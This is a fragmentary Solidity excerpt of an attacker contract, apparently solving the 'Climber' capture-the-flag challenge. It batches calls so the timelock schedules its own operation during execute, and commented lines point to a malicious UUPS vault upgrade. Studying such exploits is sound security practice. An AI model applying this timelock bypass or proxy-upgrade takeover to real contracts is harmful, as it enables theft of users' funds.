...
contract ClimberAttacker {
    ...
    function attack() public {
        ...
        values[2] = uint256(0);
        dataElements[2] = abi.encodeWithSelector(this.schedule.selector, targets, values, dataElements, salt); 

        //4: I send these actions for execution
        ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
        
        // vaultAttacker = new VaultAttacker();

        // targets[3] = vault;
        // values[3] = uint256(0);
        // dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(vaultAttacker));

    }
    

    function schedule(address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements,
            bytes32 salt) public {
        console.log("ClimberAttacker.schedule: entered by %s", msg.sender);
